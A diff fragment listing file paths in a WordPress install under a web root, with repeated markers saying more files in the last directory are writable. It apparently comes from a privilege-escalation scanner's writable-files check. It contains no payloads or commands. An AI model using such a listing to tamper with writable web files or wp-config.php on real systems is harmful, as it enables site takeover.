+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/maint/repair.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/media-new.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/media-upload.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/media.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/menu-header.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/menu.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/network/about.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/network/admin.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/network/credits.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/network/edit.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/network/freedoms.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/options-discussion.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/options-general.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/options-head.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/options-media.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/options-permalink.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/user/about.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/user/admin.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/user/credits.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/user/freedoms.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/user/index.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/users.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-admin/widgets.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-blog-header.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-comments-post.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-config.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/index.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/languages
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/languages/admin-en_GB.mo
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/languages/admin-en_GB.po
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/languages/admin-network-en_GB.mo
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/languages/admin-network-en_GB.po
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/languages/en_GB-0ce75ad2f775d1cac9696967d484808c.json
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/languages/plugins/akismet-en_GB.mo
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/languages/plugins/akismet-en_GB.po
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/languages/plugins/hello-dolly-en_GB.mo
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/languages/plugins/hello-dolly-en_GB.po
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/languages/themes
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/languages/themes/twentynineteen-en_GB.mo
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/languages/themes/twentynineteen-en_GB.po
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/languages/themes/twentyseventeen-en_GB.mo
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/languages/themes/twentyseventeen-en_GB.po
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/languages/themes/twentysixteen-en_GB.mo
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/.htaccess
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/LICENSE.txt
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/_inc
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/_inc/akismet.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/_inc/akismet.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/_inc/form.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/_inc/img
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/akismet.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/changelog.txt
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/class.akismet-admin.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/class.akismet-cli.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/class.akismet-rest-api.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/views/activate.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/views/config.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/views/connect-jp.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/views/enter.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/views/get.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/akismet/wrapper.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/hello.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/plugins/index.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/index.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/404.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/archive.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/classes
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/classes/class-twentynineteen-svg-icons.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/classes/class-twentynineteen-walker-comment.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/comments.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/fonts
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/fonts/NonBreakingSpaceOverride.woff
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/fonts/NonBreakingSpaceOverride.woff2
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/footer.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/functions.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/header.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/image.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/inc
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/inc/back-compat.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/inc/color-patterns.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/inc/customizer.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/inc/helper-functions.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/inc/icon-functions.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/index.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/js/customize-controls.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/js/customize-preview.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/js/priority-menu.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/js/skip-link-focus-fix.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/js/touch-keyboard-navigation.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/package-lock.json
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/package.json
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/page.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/postcss.config.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/print.css
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/_normalize.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/blocks
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/blocks/_blocks.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/elements
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/elements/_elements.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/elements/_lists.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/elements/_tables.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/forms
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/forms/_buttons.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/forms/_fields.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/forms/_forms.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/layout
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/layout/_layout.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/media
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/media/_captions.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/media/_galleries.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/media/_media.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/mixins
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/mixins/_mixins-master.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/mixins/_utilities.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/modules
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/modules/_accessibility.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/modules/_alignments.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/modules/_clearings.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/navigation
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/navigation/_links.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/navigation/_menu-footer-navigation.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/navigation/_menu-main-navigation.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/navigation/_menu-social-navigation.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/navigation/_navigation.scss
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/site
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/site/_site.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/site/footer
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/site/footer/_site-footer.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/site/header
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/site/header/_site-featured-image.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/site/header/_site-header.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/site/primary
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/site/primary/_archives.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/site/primary/_comments.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/site/primary/_posts-and-pages.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/site/secondary
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/site/secondary/_widgets.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/typography
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/typography/_copy.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/typography/_headings.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/typography/_typography.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/variables-site
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/variables-site/_colors.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/variables-site/_columns.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/variables-site/_fonts.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/variables-site/_structure.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/sass/variables-site/_transitions.scss
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/search.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/single.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/style-editor-customizer.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/style-editor-customizer.scss
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/style-editor.css
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/template-parts/content
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/template-parts/content/content-excerpt.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/template-parts/content/content-none.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/template-parts/content/content-page.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/template-parts/content/content-single.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/template-parts/content/content.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/template-parts/footer
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/template-parts/footer/footer-widgets.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/template-parts/header
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/template-parts/header/entry-header.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/template-parts/header/site-branding.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/template-parts/post
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/template-parts/post/author-bio.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentynineteen/template-parts/post/discussion-meta.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/404.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/archive.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/assets
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/assets/css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/assets/css/blocks.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/assets/css/colors-dark.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/assets/css/editor-blocks.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/assets/css/editor-style.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/assets/css/ie8.css
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/assets/images
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/assets/js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/assets/js/customize-controls.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/assets/js/customize-preview.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/assets/js/global.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/assets/js/html5.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/assets/js/jquery.scrollTo.js
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/comments.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/footer.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/front-page.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/functions.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/header.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/inc/back-compat.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/inc/color-patterns.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/inc/custom-header.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/inc/customizer.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/inc/icon-functions.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/index.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/page.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/readme.txt
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/rtl.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/search.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/template-parts/footer
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/template-parts/footer/footer-widgets.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/template-parts/footer/site-info.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/template-parts/header
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/template-parts/header/header-image.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/template-parts/header/site-branding.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/template-parts/navigation
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/template-parts/navigation/navigation-top.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/template-parts/page
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/template-parts/page/content-front-page-panels.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/template-parts/page/content-front-page.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/template-parts/page/content-page.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/template-parts/post
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/template-parts/post/content-audio.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/template-parts/post/content-excerpt.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/template-parts/post/content-gallery.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/template-parts/post/content-image.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentyseventeen/template-parts/post/content-none.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/.stylelintrc.json
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/404.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/assets
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/assets/css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/assets/css/editor-style-block-rtl.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/assets/css/editor-style-block.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/assets/css/editor-style-classic-rtl.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/assets/css/editor-style-classic.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/assets/fonts
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/assets/fonts/inter
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/assets/fonts/inter/Inter-italic-var.woff2
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/assets/fonts/inter/Inter-upright-var.woff2
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/assets/images
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/assets/js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/assets/js/color-calculations.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/assets/js/customize-controls.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/assets/js/customize-preview.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/assets/js/customize.js
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/assets/js/editor-script-block.js
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/classes
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/classes/class-twentytwenty-customize.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/classes/class-twentytwenty-non-latin-languages.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/classes/class-twentytwenty-script-loader.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/classes/class-twentytwenty-separator-control.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/classes/class-twentytwenty-svg-icons.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/comments.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/footer.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/functions.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/header.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/inc
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/inc/custom-css.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/inc/starter-content.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/inc/svg-icons.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/inc/template-tags.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/index.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/package-lock.json
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/package.json
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/print.css
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/readme.txt
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/template-parts/content-cover.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/template-parts/content.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/template-parts/entry-author-bio.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/template-parts/entry-header.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/template-parts/featured-image.php
+#)You_can_write_even_more_files_inside_last_directory
+
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/templates
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/templates/template-cover.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/themes/twentytwenty/templates/template-full-width.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/upgrade
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/uploads
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/uploads/2020
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/uploads/2020/06
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/uploads/2020/07
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-content/uploads/2020/08
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-cron.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/ID3
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/ID3/getid3.lib.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/ID3/getid3.php
+/mnt/stateful_partition/dev_image/share/nginx/html/main/wp-includes/ID3/license.commercial.txt
